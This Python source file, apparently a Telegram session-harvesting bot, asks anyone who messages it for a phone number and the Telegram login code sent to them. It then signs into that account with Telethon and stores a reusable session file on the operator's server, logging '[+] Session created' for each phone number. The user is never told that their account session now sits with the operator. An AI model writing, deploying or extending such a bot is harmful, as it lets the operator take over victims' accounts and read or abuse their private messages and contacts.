import os
from telegram.ext import ApplicationBuilder, MessageHandler, filters
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

# Your API credentials from https://my.telegram.org
API_ID = YOUR_API_ID  # <-- Replace with your API ID (integer)
API_HASH = "YOUR_API_HASH"  # <-- Replace with your API HASH (string)

# Your Bot Token from BotFather
BOT_TOKEN = "YOUR_BOT_TOKEN"

# Temporary state storage
user_states = {}

# Make sure sessions folder exists
os.makedirs("sessions", exist_ok=True)

# Handle incoming messages
async def message_handler(update, context):
    user_id = update.message.from_user.id
    text = update.message.text.strip()

    if user_id not in user_states:
        # First step: user sends phone number
        user_states[user_id] = {
            'phone': text,
            'step': 'waiting_for_otp'
        }
        
        # Create Telethon client for user
        client = TelegramClient(f"sessions/{user_id}", API_ID, API_HASH)
        await client.connect()
        user_states[user_id]['client'] = client

        try:
            await client.send_code_request(text)
            await update.message.reply_text("📩 OTP has been sent to your Telegram. Please enter the OTP code:")
        except Exception as e:
            await update.message.reply_text(f"❌ Error sending OTP: {e}")
            await client.disconnect()
            del user_states[user_id]

    elif user_states[user_id]['step'] == 'waiting_for_otp':
        # Second step: user sends OTP
        client = user_states[user_id]['client']
        phone = user_states[user_id]['phone']
        otp = text

        try:
            await client.sign_in(phone=phone, code=otp)

            # Save session automatically when logged in
            await client.disconnect()
            
            await update.message.reply_text("✅ Session created successfully!")
            print(f"[+] Session created for {phone}")

        except SessionPasswordNeededError:
            await update.message.reply_text("🔒 Your account has 2FA password enabled. Cannot proceed.")
            await client.disconnect()

        except Exception as e:
            await update.message.reply_text(f"❌ Error logging in: {e}")
            await client.disconnect()

        # Cleanup user state
        if user_id in user_states:
            del user_states[user_id]

# Main function
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
